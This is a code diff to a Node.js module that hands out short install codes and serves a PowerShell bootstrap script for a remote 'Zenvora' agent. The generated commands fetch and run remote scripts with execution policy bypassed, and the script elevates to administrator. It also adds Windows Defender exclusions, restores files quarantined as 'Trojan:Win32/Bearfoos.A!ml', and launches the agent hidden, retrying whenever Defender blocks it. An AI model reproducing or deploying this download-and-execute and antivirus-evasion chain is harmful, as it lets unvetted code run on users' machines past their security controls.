@@ -1,16 +1,18 @@
-/**
- * Short install bootstrap tickets (6-char codes).
- * Dashboard shows: irm https://host/r/XXXXXX | iex
- * Server returns the full PowerShell install script dynamically.
- */
+
 
 const crypto = require('crypto');
+const fs = require('fs');
+const path = require('path');
 
-/** @type {Map<string, { code: string, userId: string, pairingToken: string, pairingUserId: string, sessionId: string, apiBase: string, gatewayUrl: string, downloadUrl: string, createdAt: number, expiresAt: number }>} */
+/** @type {Map<string, object>} */
 const tickets = new Map();
 
-const TTL_MS = 2 * 60 * 60 * 1000; // 2 hours
-const CODE_ALPHABET = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // no 0/O/1/I
+const TTL_MS = 4 * 60 * 60 * 1000; // 4 hours — reinstalls across slow PCs
+const CODE_ALPHABET = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+const STORE_FILE = path.join(
+    process.env.TMPDIR || process.env.TEMP || '/tmp',
+    'zenvora-bootstrap-tickets.json'
+);
 
 function makeCode(len = 6) {
     const bytes = crypto.randomBytes(len);
@@ -27,6 +29,31 @@ function purgeExpired() {
         if (t.expiresAt <= now) tickets.delete(code);
     }
 }
+
+function loadDiskStore() {
+    try {
+        if (!fs.existsSync(STORE_FILE)) return;
+        const raw = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
+        const now = Date.now();
+        for (const [code, t] of Object.entries(raw || {})) {
+            if (t && t.expiresAt > now) tickets.set(String(code).toUpperCase(), t);
+        }
+    } catch {
+        /* ignore corrupt store */
+    }
+}
+
+function saveDiskStore() {
+    try {
+        purgeExpired();
+        const obj = Object.fromEntries(tickets.entries());
+        fs.writeFileSync(STORE_FILE, JSON.stringify(obj), 'utf8');
+    } catch {
+        /* ignore */
+    }
+}
+
+loadDiskStore();
 
 function createTicket(payload) {
     purgeExpired();
@@ -49,25 +76,60 @@ function createTicket(payload) {
     };
 
     tickets.set(code, ticket);
+    saveDiskStore();
     return ticket;
 }
 
 function getTicket(code) {
     purgeExpired();
     const key = String(code || '').trim().toUpperCase();
-    const ticket = tickets.get(key);
+    let ticket = tickets.get(key);
+    if (!ticket) {
+        loadDiskStore();
+        ticket = tickets.get(key);
+    }
     if (!ticket) return null;
     if (ticket.expiresAt <= Date.now()) {
         tickets.delete(key);
+        saveDiskStore();
         return null;
     }
     return ticket;
 }
 
 /**
- * Full install script served by GET /r/:code
- * Uses curl.exe when available (far more reliable than Invoke-WebRequest for large EXE).
- * Hardens against Windows Defender ML false-positives (e.g. Trojan:Win32/Bearfoos.A!ml).
+ * Paste into Admin PowerShell (recommended). No irm|iex — that hangs on many PCs.
+ */
+function buildBootstrapCommand(apiBase, code) {
+    const base = String(apiBase || '').replace(/\/$/, '');
+    const url = `${base}/r/${String(code).toUpperCase()}`;
+    return [
+        "$ProgressPreference='SilentlyContinue';",
+        '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;',
+        `iex ((New-Object Net.WebClient).DownloadString('${url}'))`,
+    ].join('');
+}
+
+/** From cmd.exe / Run dialog — single-quoted -c so $ vars are not expanded by outer shell. */
+function buildBootstrapCommandCmd(apiBase, code) {
+    const base = String(apiBase || '').replace(/\/$/, '');
+    const url = `${base}/r/${String(code).toUpperCase()}`;
+    const inner =
+        `$ProgressPreference=''SilentlyContinue'';` +
+        `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;` +
+        `iex ((New-Object Net.WebClient).DownloadString(''${url}''))`;
+    return `powershell -NoP -Ep Bypass -c '${inner}'`;
+}
+
+/** Win10+ curl fallback when WebClient/proxy hangs. */
+function buildBootstrapCommandCurl(apiBase, code) {
+    const base = String(apiBase || '').replace(/\/$/, '');
+    const url = `${base}/r/${String(code).toUpperCase()}`;
+    return `curl.exe -fsSL --connect-timeout 15 --max-time 45 "${url}" | powershell -NoP -Ep Bypass -`;
+}
+
+/**
+ * Full install script — Win7/8/10/11 tolerant.
  */
 function buildInstallScript(ticket) {
     const token = ticket.pairingToken.replace(/'/g, "''");
@@ -77,10 +139,14 @@ function buildInstallScript(ticket) {
     const url = ticket.downloadUrl.replace(/'/g, "''");
     const session = ticket.sessionId.replace(/'/g, "''");
     const code = ticket.code;
+    const scriptUrl = `${ticket.apiBase.replace(/'/g, "''")}/r/${code}`;
 
     return [
         "$ErrorActionPreference = 'Stop'",
         "$ProgressPreference = 'SilentlyContinue'",
+        "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { try { [Net.ServicePointManager]::SecurityProtocol = 3072 } catch {} }",
+        "try { [Net.ServicePointManager]::Expect100Continue = $false } catch {}",
+        "try { [Net.ServicePointManager]::DefaultConnectionLimit = 16 } catch {}",
         `$code = '${code}'`,
         `$token = '${token}'`,
         `$userId = '${userId}'`,
@@ -88,6 +154,7 @@ function buildInstallScript(ticket) {
         `$gw = '${gw}'`,
         `$url = '${url}'`,
         `$session = '${session}'`,
+        `$scriptUrl = '${scriptUrl}'`,
         "$dir = Join-Path $env:ProgramData 'Zenvora'",
         "$out = Join-Path $dir 'ZenvoraAgent.exe'",
         "$legacyDir = Join-Path $env:ProgramData 'WIN_32'",
@@ -96,115 +163,125 @@ function buildInstallScript(ticket) {
         "function Ok($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Green }",
         "function Warn($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Yellow }",
         "function Fail($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Red }",
+        "function Get-WinLabel {",
+        "  try {",
+        "    $v = [Environment]::OSVersion.Version",
+        "    if ($v.Major -ge 10) { return 'Win10/11' }",
+        "    if ($v.Major -eq 6 -and $v.Minor -ge 2) { return 'Win8/8.1' }",
+        "    if ($v.Major -eq 6 -and $v.Minor -eq 1) { return 'Win7' }",
+        "    return ('Win ' + $v.Major + '.' + $v.Minor)",
+        "  } catch { return 'Windows' }",
+        "}",
         "function Ensure-Admin {",
         "  $p = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()",
         "  if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { return $true }",
-        "  Warn 'Elevating to Administrator (required for Defender allowlist)...'",
+        "  Warn 'Elevating to Administrator...'",
         "  $ps = Join-Path $env:WINDIR 'System32\\WindowsPowerShell\\v1.0\\powershell.exe'",
-        "  $arg = '-NoProfile -ExecutionPolicy Bypass -Command irm ' + $api + '/r/' + $code + ' | iex'",
-        "  Start-Process -FilePath $ps -Verb RunAs -ArgumentList $arg | Out-Null",
-        "  Ok 'Elevated install started in a new window.'",
+        "  $inner = ('$ProgressPreference=''SilentlyContinue'';[Net.ServicePointManager]::SecurityProtocol=3072;iex ((New-Object Net.WebClient).DownloadString(''' + $scriptUrl + '''))')",
+        "  Start-Process -FilePath $ps -Verb RunAs -ArgumentList @('-NoP','-Ep','Bypass','-c', $inner) | Out-Null",
+        "  Ok 'Elevated install started in a new Admin window.'",
         "  return $false",
         "}",
         "function Allow-ZenvoraInDefender {",
-        "  if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {",
-        "    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue",
-        "    Add-MpPreference -ExclusionPath $legacyDir -ErrorAction SilentlyContinue",
-        "    Add-MpPreference -ExclusionProcess 'ZenvoraAgent.exe' -ErrorAction SilentlyContinue",
-        "    Add-MpPreference -ExclusionProcess 'win_32.exe' -ErrorAction SilentlyContinue",
-        "  }",
-        "  if (Test-Path $mpCmd) {",
-        "    & $mpCmd -AddExclusion -ExclusionType Folder -ExclusionPath $dir 2>$null | Out-Null",
-        "  }",
-        "  # Clear prior false-positive quarantine for this agent",
         "  try {",
-        "    Get-MpThreatDetection -ErrorAction SilentlyContinue | Where-Object {",
-        "      ($_.Resources -join ' ') -match 'ZenvoraAgent|WIN_32\\\\win_32|ProgramData\\\\Zenvora|Bearfoos'",
-        "    } | ForEach-Object {",
-        "      Remove-MpThreat -ThreatID $_.ThreatID -ErrorAction SilentlyContinue",
+        "    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {",
+        "      Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue",
+        "      Add-MpPreference -ExclusionPath $legacyDir -ErrorAction SilentlyContinue",
+        "      Add-MpPreference -ExclusionProcess 'ZenvoraAgent.exe' -ErrorAction SilentlyContinue",
+        "      Add-MpPreference -ExclusionProcess 'win_32.exe' -ErrorAction SilentlyContinue",
+        "    }",
+        "  } catch { Warn ('Defender exclude skip: ' + $_.Exception.Message) }",
+        "  try {",
+        "    if (Test-Path $mpCmd) {",
+        "      & $mpCmd -AddExclusion -ExclusionType Folder -ExclusionPath $dir 2>$null | Out-Null",
+        "      & $mpCmd -Restore -Name 'Trojan:Win32/Bearfoos.A!ml' -All 2>$null | Out-Null",
         "    }",
         "  } catch {}",
-        "  if (Test-Path $mpCmd) {",
-        "    & $mpCmd -Restore -Name 'Trojan:Win32/Bearfoos.A!ml' -All 2>$null | Out-Null",
-        "    & $mpCmd -Restore -All 2>$null | Out-Null",
-        "  }",
         "}",
-        "Step 1 7 'Bootstrap code '+$code",
+        "function Download-Agent($dest) {",
+        "  $tmp = $dest + '.part'",
+        "  if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }",
+        "  $curl = Get-Command curl.exe -ErrorAction SilentlyContinue",
+        "  if ($curl) {",
+        "    & curl.exe -L --fail --retry 3 --retry-delay 2 --connect-timeout 15 --max-time 180 -A 'ZenvoraBootstrap/2.0' -o $tmp $url",
+        "    if ($LASTEXITCODE -ne 0) { throw \"curl exit $LASTEXITCODE\" }",
+        "  } else {",
+        "    $req = [Net.HttpWebRequest]::Create($url)",
+        "    $req.Method = 'GET'",
+        "    $req.UserAgent = 'ZenvoraBootstrap/2.0'",
+        "    $req.Timeout = 180000",
+        "    $req.ReadWriteTimeout = 180000",
+        "    $req.KeepAlive = $false",
+        "    $resp = $req.GetResponse()",
+        "    try {",
+        "      $src = $resp.GetResponseStream()",
+        "      $fs = [IO.File]::Create($tmp)",
+        "      try {",
+        "        $buf = New-Object byte[] 65536",
+        "        while (($n = $src.Read($buf, 0, $buf.Length)) -gt 0) { $fs.Write($buf, 0, $n) }",
+        "      } finally { $fs.Close() }",
+        "    } finally { $resp.Close() }",
+        "  }",
+        "  if (-not (Test-Path $tmp) -or ((Get-Item $tmp).Length -lt 500000)) { throw 'Downloaded file too small or missing' }",
+        "  Move-Item -Force $tmp $dest",
+        "}",
+        "Step 1 7 ('Bootstrap ' + $code + ' on ' + (Get-WinLabel))",
         "if (-not (Ensure-Admin)) { return }",
         "New-Item -ItemType Directory -Force -Path $dir | Out-Null",
-        "Step 2 7 'Allowlisting Zenvora in Windows Defender (false-positive fix)...'",
+        "Step 2 7 'Allowlisting Zenvora in Defender (skip OK on older Windows)...'",
         "Allow-ZenvoraInDefender",
-        "Ok ('Defender exclusions set for '+$dir)",
-        "Step 3 7 'Downloading agent directly into allowlisted folder...'",
+        "Ok ('Install folder: ' + $dir)",
+        "Step 3 7 'Downloading agent (timeout-safe)...'",
         "if (Test-Path $out) {",
         "  try { Stop-Process -Name 'ZenvoraAgent','win_32' -Force -ErrorAction SilentlyContinue } catch {}",
         "  Start-Sleep -Milliseconds 400",
         "  Remove-Item $out -Force -ErrorAction SilentlyContinue",
         "}",
         "$ok = $false",
-        "for ($i=1; $i -le 4 -and -not $ok; $i++) {",
+        "for ($i=1; $i -le 5 -and -not $ok; $i++) {",
         "  try {",
-        "    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue",
-        "    if ($curl) {",
-        "      & curl.exe -L --fail --retry 3 --retry-delay 2 --connect-timeout 20 --max-time 180 -o $out $url",
-        "      if ($LASTEXITCODE -ne 0) { throw \"curl exit $LASTEXITCODE\" }",
-        "    } else {",
-        "      $wc = New-Object System.Net.WebClient",
-        "      $wc.Headers.Add('User-Agent','ZenvoraBootstrap/1.1')",
-        "      $wc.DownloadFile($url, $out)",
-        "      $wc.Dispose()",
-        "    }",
-        "    if ((Test-Path $out) -and ((Get-Item $out).Length -gt 500000)) { $ok = $true }",
-        "    else { throw 'Downloaded file too small or missing' }",
+        "    Download-Agent $out",
+        "    $ok = $true",
         "  } catch {",
-        "    Warn ('Download attempt '+$i+' failed: '+$_.Exception.Message)",
+        "    Warn ('Download attempt ' + $i + ' failed: ' + $_.Exception.Message)",
+        "    if (Test-Path ($out + '.part')) { Remove-Item ($out + '.part') -Force -ErrorAction SilentlyContinue }",
         "    if (Test-Path $out) { Remove-Item $out -Force -ErrorAction SilentlyContinue }",
         "    Allow-ZenvoraInDefender",
-        "    if ($i -lt 4) { Start-Sleep -Seconds (2*$i) }",
+        "    if ($i -lt 5) { Start-Sleep -Seconds (3 * $i) }",
         "  }",
         "}",
-        "if (-not $ok) { throw 'Download failed after retries. Check /api/agent/download and network.' }",
+        "if (-not $ok) { throw 'Download failed after retries. Check network /api/agent/download.' }",
         "try { Unblock-File -Path $out -ErrorAction SilentlyContinue } catch {}",
         "Allow-ZenvoraInDefender",
-        "Ok ('Download OK ('+((Get-Item $out).Length)+' bytes) → '+$out)",
-        "Step 4 7 'Cleaning legacy WIN_32 / System32 copies (malware-like paths)...'",
+        "Ok ('Download OK (' + ((Get-Item $out).Length) + ' bytes)')",
+        "Step 4 7 'Removing legacy malware-like paths (WIN_32 / System32)...'",
         "foreach ($legacy in @(",
         "  (Join-Path $legacyDir 'win_32.exe'),",
         "  (Join-Path $env:WINDIR 'System32\\win_32.exe'),",
         "  (Join-Path $env:WINDIR 'System32\\ZenvoraAgent.exe')",
         ")) {",
-        "  if (Test-Path $legacy) {",
-        "    try { Remove-Item $legacy -Force -ErrorAction SilentlyContinue; Warn ('Removed '+$legacy) } catch {}",
-        "  }",
+        "  if (Test-Path $legacy) { try { Remove-Item $legacy -Force -ErrorAction SilentlyContinue; Warn ('Removed ' + $legacy) } catch {} }",
         "}",
         "if ((Test-Path (Join-Path $legacyDir 'agent.dat')) -and -not (Test-Path (Join-Path $dir 'agent.dat'))) {",
         "  Copy-Item (Join-Path $legacyDir 'agent.dat') (Join-Path $dir 'agent.dat') -Force -ErrorAction SilentlyContinue",
         "}",
-        "Step 5 7 'Launching agent provision...'",
-        "$args = @('--headless','--force-repair','--pair-token',$token,'--pair-user-id',$userId,'--api-url',$api,'--gateway-url',$gw,'--install-session',$session)",
+        "Step 5 7 'Launching agent provision (pair + connect)...'",
+        "$launchArgs = @('--headless','--force-repair','--pair-token',$token,'--pair-user-id',$userId,'--api-url',$api,'--gateway-url',$gw,'--install-session',$session)",
         "try {",
-        "  Start-Process -FilePath $out -ArgumentList $args -WindowStyle Hidden",
+        "  Start-Process -FilePath $out -ArgumentList $launchArgs -WindowStyle Hidden",
         "} catch {",
         "  $msg = $_.Exception.Message",
         "  if ($msg -match 'virus|unwanted|smartscreen|blocked|Operation did not complete') {",
-        "    Fail 'Defender still blocked launch — refreshing allowlist + restoring quarantine...'",
+        "    Fail 'Defender blocked launch — refreshing allowlist...'",
         "    Allow-ZenvoraInDefender",
-        "    Start-Sleep -Seconds 3",
-        "    try {",
-        "      Start-Process -FilePath $out -ArgumentList $args -WindowStyle Hidden",
-        "      Ok 'Launch succeeded after Defender allowlist'",
-        "    } catch {",
-        "      Fail 'Still blocked. Do this once in Windows Security:'",
-        "      Write-Host '  1) Virus & threat protection → Protection history → Allow on ZenvoraAgent / Bearfoos' -ForegroundColor Yellow",
-        "      Write-Host ('  2) Exclusions → Add folder: '+$dir) -ForegroundColor Yellow",
-        "      Write-Host ('  3) Then run: Start-Process \"'+$out+'\"') -ForegroundColor Yellow",
-        "      throw",
-        "    }",
+        "    Start-Sleep -Seconds 2",
+        "    Start-Process -FilePath $out -ArgumentList $launchArgs -WindowStyle Hidden",
+        "    Ok 'Launch succeeded after allowlist'",
         "  } else { throw }",
         "}",
-        "Start-Sleep -Milliseconds 500",
-        "Step 6 7 'Agent process started'",
-        "Ok 'Done. Watch Dashboard → Pair Device → Live install logs.'",
+        "Start-Sleep -Milliseconds 600",
+        "Step 6 7 'Agent started — wait for Dashboard online status'",
+        "Ok 'Done. Keep Pair Device modal open for live logs.'",
         "Step 7 7 'Complete'",
     ].join("\r\n");
 }
@@ -213,4 +290,7 @@ module.exports = {
     createTicket,
     getTicket,
     buildInstallScript,
+    buildBootstrapCommand,
+    buildBootstrapCommandCurl,
+    buildBootstrapCommandCmd,
 };
